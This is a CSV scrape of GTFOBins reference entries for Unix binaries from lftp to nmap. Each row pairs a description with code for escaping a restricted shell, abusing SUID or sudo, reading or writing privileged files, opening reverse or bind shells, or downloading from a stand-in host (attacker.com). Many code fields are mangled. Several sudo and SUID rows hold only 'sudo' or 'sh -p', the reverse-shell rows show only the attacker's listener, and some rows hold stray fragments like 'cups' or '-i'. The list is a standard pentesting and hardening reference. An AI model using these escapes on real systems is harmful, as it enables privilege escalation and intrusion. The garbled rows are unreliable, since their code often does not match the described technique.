lftp,Limited SUID,https://gtfobins.github.io/gtfobins/lftp/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
links,File read,https://gtfobins.github.io/gtfobins/links/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
links ""$LFILE"""
links,SUID,https://gtfobins.github.io/gtfobins/links/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
links,Sudo,https://gtfobins.github.io/gtfobins/links/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ln,Sudo,https://gtfobins.github.io/gtfobins/ln/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
loginctl,Shell,https://gtfobins.github.io/gtfobins/loginctl/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"loginctl user-status
!/bin/sh"
loginctl,Sudo,https://gtfobins.github.io/gtfobins/loginctl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
logsave,Shell,https://gtfobins.github.io/gtfobins/logsave/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,logsave /dev/null /bin/sh -i
logsave,SUID,https://gtfobins.github.io/gtfobins/logsave/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
logsave,Sudo,https://gtfobins.github.io/gtfobins/logsave/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
look,File read,https://gtfobins.github.io/gtfobins/look/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
look '' ""$LFILE"""
look,SUID,https://gtfobins.github.io/gtfobins/look/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
look,Sudo,https://gtfobins.github.io/gtfobins/look/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
lp,File upload,https://gtfobins.github.io/gtfobins/lp/#file-upload,It can exfiltrate files on the network.,cups
ltrace,Shell,https://gtfobins.github.io/gtfobins/ltrace/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,ltrace -b -L /bin/sh
ltrace,File write,https://gtfobins.github.io/gtfobins/ltrace/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",ltrace -F DATA
ltrace,File read,https://gtfobins.github.io/gtfobins/ltrace/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
ltrace -F $LFILE /dev/null"
ltrace,Sudo,https://gtfobins.github.io/gtfobins/ltrace/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
lua,Shell,https://gtfobins.github.io/gtfobins/lua/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"lua -e 'os.execute(""/bin/sh"")'"
lua,Non-interactive reverse shell,https://gtfobins.github.io/gtfobins/lua/#non-interactive-reverse-shell,It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
lua,Non-interactive bind shell,https://gtfobins.github.io/gtfobins/lua/#non-interactive-bind-shell,It can bind a non-interactive shell to a local port to allow remote network access.,nc target.com 12345
lua,File upload,https://gtfobins.github.io/gtfobins/lua/#file-upload,It can exfiltrate files on the network.,"nc -l -p 12345 > ""file_to_save"""
lua,File download,https://gtfobins.github.io/gtfobins/lua/#file-download,It can download remote files.,"nc target.com 12345 < ""file_to_send"""
lua,File write,https://gtfobins.github.io/gtfobins/lua/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","lua -e 'local f=io.open(""file_to_write"", ""wb""); f:write(""DATA""); io.close(f);'"
lua,File read,https://gtfobins.github.io/gtfobins/lua/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","lua -e 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);'"
lua,SUID,https://gtfobins.github.io/gtfobins/lua/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
lua,Sudo,https://gtfobins.github.io/gtfobins/lua/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
lua,Limited SUID,https://gtfobins.github.io/gtfobins/lua/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
lualatex,Shell,https://gtfobins.github.io/gtfobins/lualatex/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute(""/bin/sh"")}\end{document}'"
lualatex,Sudo,https://gtfobins.github.io/gtfobins/lualatex/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
lualatex,Limited SUID,https://gtfobins.github.io/gtfobins/lualatex/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
luatex,Shell,https://gtfobins.github.io/gtfobins/luatex/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'"
luatex,Sudo,https://gtfobins.github.io/gtfobins/luatex/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
luatex,Limited SUID,https://gtfobins.github.io/gtfobins/luatex/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
lwp-download,File download,https://gtfobins.github.io/gtfobins/lwp-download/#file-download,It can download remote files.,"URL=http://attacker.com/file_to_get
LFILE=file_to_save
lwp-download $URL $LFILE"
lwp-download,File write,https://gtfobins.github.io/gtfobins/lwp-download/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
TF=$(mktemp)
echo DATA >$TF
lwp-download file://$TF $LFILE"
lwp-download,File read,https://gtfobins.github.io/gtfobins/lwp-download/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
TF=$(mktemp)
lwp-download ""file://$LFILE"" $TF
cat $TF"
lwp-download,Sudo,https://gtfobins.github.io/gtfobins/lwp-download/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
lwp-request,File read,https://gtfobins.github.io/gtfobins/lwp-request/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
lwp-request ""file://$LFILE"""
lwp-request,Sudo,https://gtfobins.github.io/gtfobins/lwp-request/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
mail,Shell,https://gtfobins.github.io/gtfobins/mail/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,mail --exec='!/bin/sh'
mail,Sudo,https://gtfobins.github.io/gtfobins/mail/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
make,Shell,https://gtfobins.github.io/gtfobins/make/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"COMMAND='/bin/sh'
make -s --eval=$'x:\n\t-'""$COMMAND"""
make,File write,https://gtfobins.github.io/gtfobins/make/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",make
make,SUID,https://gtfobins.github.io/gtfobins/make/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
make,Sudo,https://gtfobins.github.io/gtfobins/make/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
man,Shell,https://gtfobins.github.io/gtfobins/man/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"man man
!/bin/sh"
man,File read,https://gtfobins.github.io/gtfobins/man/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",man file_to_read
man,Sudo,https://gtfobins.github.io/gtfobins/man/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
mawk,Shell,https://gtfobins.github.io/gtfobins/mawk/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"mawk 'BEGIN {system(""/bin/sh"")}'"
mawk,File write,https://gtfobins.github.io/gtfobins/mawk/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
mawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'"
mawk,File read,https://gtfobins.github.io/gtfobins/mawk/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
mawk '//' ""$LFILE"""
mawk,SUID,https://gtfobins.github.io/gtfobins/mawk/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
mawk,Sudo,https://gtfobins.github.io/gtfobins/mawk/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
mawk,Limited SUID,https://gtfobins.github.io/gtfobins/mawk/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
minicom,Shell,https://gtfobins.github.io/gtfobins/minicom/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,Ctrl-A o
minicom,SUID,https://gtfobins.github.io/gtfobins/minicom/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
minicom,Sudo,https://gtfobins.github.io/gtfobins/minicom/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
more,Shell,https://gtfobins.github.io/gtfobins/more/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TERM= more /etc/profile
!/bin/sh"
more,File read,https://gtfobins.github.io/gtfobins/more/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",more file_to_read
more,SUID,https://gtfobins.github.io/gtfobins/more/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
more,Sudo,https://gtfobins.github.io/gtfobins/more/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
mosquitto,File read,https://gtfobins.github.io/gtfobins/mosquitto/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
mosquitto -c ""$LFILE"""
mosquitto,SUID,https://gtfobins.github.io/gtfobins/mosquitto/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
mosquitto,Sudo,https://gtfobins.github.io/gtfobins/mosquitto/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
mount,Sudo,https://gtfobins.github.io/gtfobins/mount/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
msfconsole,Shell,https://gtfobins.github.io/gtfobins/msfconsole/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"sudo msfconsole
msf6 > irb
>> system(""/bin/sh"")"
msfconsole,Sudo,https://gtfobins.github.io/gtfobins/msfconsole/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
msgattrib,File read,https://gtfobins.github.io/gtfobins/msgattrib/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
msgattrib -P $LFILE"
msgattrib,SUID,https://gtfobins.github.io/gtfobins/msgattrib/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
msgattrib,Sudo,https://gtfobins.github.io/gtfobins/msgattrib/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
msgcat,File read,https://gtfobins.github.io/gtfobins/msgcat/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
msgcat -P $LFILE"
msgcat,SUID,https://gtfobins.github.io/gtfobins/msgcat/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
msgcat,Sudo,https://gtfobins.github.io/gtfobins/msgcat/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
msgconv,File read,https://gtfobins.github.io/gtfobins/msgconv/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
msgconv -P $LFILE"
msgconv,SUID,https://gtfobins.github.io/gtfobins/msgconv/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
msgconv,Sudo,https://gtfobins.github.io/gtfobins/msgconv/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
msgfilter,Shell,https://gtfobins.github.io/gtfobins/msgfilter/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,-i
msgfilter,File read,https://gtfobins.github.io/gtfobins/msgfilter/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",.properties
msgfilter,SUID,https://gtfobins.github.io/gtfobins/msgfilter/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
msgfilter,Sudo,https://gtfobins.github.io/gtfobins/msgfilter/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
msgmerge,File read,https://gtfobins.github.io/gtfobins/msgmerge/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
msgmerge -P $LFILE /dev/null"
msgmerge,SUID,https://gtfobins.github.io/gtfobins/msgmerge/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
msgmerge,Sudo,https://gtfobins.github.io/gtfobins/msgmerge/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
msguniq,File read,https://gtfobins.github.io/gtfobins/msguniq/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
msguniq -P $LFILE"
msguniq,SUID,https://gtfobins.github.io/gtfobins/msguniq/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
msguniq,Sudo,https://gtfobins.github.io/gtfobins/msguniq/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
mtr,File read,https://gtfobins.github.io/gtfobins/mtr/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
mtr --raw -F ""$LFILE"""
mtr,Sudo,https://gtfobins.github.io/gtfobins/mtr/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
multitime,Shell,https://gtfobins.github.io/gtfobins/multitime/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,multitime /bin/sh
multitime,SUID,https://gtfobins.github.io/gtfobins/multitime/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
multitime,Sudo,https://gtfobins.github.io/gtfobins/multitime/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
mv,SUID,https://gtfobins.github.io/gtfobins/mv/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
mv,Sudo,https://gtfobins.github.io/gtfobins/mv/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
mysql,Shell,https://gtfobins.github.io/gtfobins/mysql/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,mysql -e '\! /bin/sh'
mysql,Library load,https://gtfobins.github.io/gtfobins/mysql/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,/path/to/lib.so
mysql,Sudo,https://gtfobins.github.io/gtfobins/mysql/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
mysql,Limited SUID,https://gtfobins.github.io/gtfobins/mysql/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
nano,Shell,https://gtfobins.github.io/gtfobins/nano/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"nano
^R^X
reset; sh 1>&0 2>&0"
nano,File write,https://gtfobins.github.io/gtfobins/nano/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","nano file_to_write
DATA
^O"
nano,File read,https://gtfobins.github.io/gtfobins/nano/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",nano file_to_read
nano,Sudo,https://gtfobins.github.io/gtfobins/nano/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nano,Limited SUID,https://gtfobins.github.io/gtfobins/nano/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
nasm,File read,https://gtfobins.github.io/gtfobins/nasm/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
nasm -@ $LFILE"
nasm,SUID,https://gtfobins.github.io/gtfobins/nasm/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
nasm,Sudo,https://gtfobins.github.io/gtfobins/nasm/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nawk,Shell,https://gtfobins.github.io/gtfobins/nawk/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"nawk 'BEGIN {system(""/bin/sh"")}'"
nawk,Non-interactive reverse shell,https://gtfobins.github.io/gtfobins/nawk/#non-interactive-reverse-shell,It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
nawk,Non-interactive bind shell,https://gtfobins.github.io/gtfobins/nawk/#non-interactive-bind-shell,It can bind a non-interactive shell to a local port to allow remote network access.,nc target.com 12345
nawk,File write,https://gtfobins.github.io/gtfobins/nawk/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
nawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'"
nawk,File read,https://gtfobins.github.io/gtfobins/nawk/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
nawk '//' ""$LFILE"""
nawk,SUID,https://gtfobins.github.io/gtfobins/nawk/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
nawk,Sudo,https://gtfobins.github.io/gtfobins/nawk/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nawk,Limited SUID,https://gtfobins.github.io/gtfobins/nawk/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
nc,Reverse shell,https://gtfobins.github.io/gtfobins/nc/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
nc,Bind shell,https://gtfobins.github.io/gtfobins/nc/#bind-shell,It can bind a shell to a local port to allow remote network access.,nc target.com 12345
nc,File upload,https://gtfobins.github.io/gtfobins/nc/#file-upload,It can exfiltrate files on the network.,"nc -l -p 12345 > ""file_to_save"""
nc,File download,https://gtfobins.github.io/gtfobins/nc/#file-download,It can download remote files.,"nc target.com 12345 < ""file_to_send"""
nc,Sudo,https://gtfobins.github.io/gtfobins/nc/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nc,Limited SUID,https://gtfobins.github.io/gtfobins/nc/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
ncdu,Shell,https://gtfobins.github.io/gtfobins/ncdu/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"ncdu
b"
ncdu,Sudo,https://gtfobins.github.io/gtfobins/ncdu/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ncdu,Limited SUID,https://gtfobins.github.io/gtfobins/ncdu/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
ncftp,Shell,https://gtfobins.github.io/gtfobins/ncftp/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"ncftp
!/bin/sh"
ncftp,SUID,https://gtfobins.github.io/gtfobins/ncftp/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ncftp,Sudo,https://gtfobins.github.io/gtfobins/ncftp/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
neofetch,Shell,https://gtfobins.github.io/gtfobins/neofetch/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp)
echo 'exec /bin/sh' >$TF
neofetch --config $TF"
neofetch,File read,https://gtfobins.github.io/gtfobins/neofetch/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
neofetch --ascii $LFILE"
neofetch,Sudo,https://gtfobins.github.io/gtfobins/neofetch/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nft,File read,https://gtfobins.github.io/gtfobins/nft/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
nft -f ""$LFILE"""
nft,SUID,https://gtfobins.github.io/gtfobins/nft/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
nft,Sudo,https://gtfobins.github.io/gtfobins/nft/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nice,Shell,https://gtfobins.github.io/gtfobins/nice/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,nice /bin/sh
nice,SUID,https://gtfobins.github.io/gtfobins/nice/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
nice,Sudo,https://gtfobins.github.io/gtfobins/nice/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nl,File read,https://gtfobins.github.io/gtfobins/nl/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
nl -bn -w1 -s '' $LFILE"
nl,SUID,https://gtfobins.github.io/gtfobins/nl/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
nl,Sudo,https://gtfobins.github.io/gtfobins/nl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nm,File read,https://gtfobins.github.io/gtfobins/nm/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
nm @$LFILE"
nm,SUID,https://gtfobins.github.io/gtfobins/nm/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
nm,Sudo,https://gtfobins.github.io/gtfobins/nm/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nmap,Shell,https://gtfobins.github.io/gtfobins/nmap/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp)
echo 'os.execute(""/bin/sh"")' > $TF
nmap --script=$TF"
nmap,Non-interactive reverse shell,https://gtfobins.github.io/gtfobins/nmap/#non-interactive-reverse-shell,It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
nmap,Non-interactive bind shell,https://gtfobins.github.io/gtfobins/nmap/#non-interactive-bind-shell,It can bind a non-interactive shell to a local port to allow remote network access.,nc target.com 12345
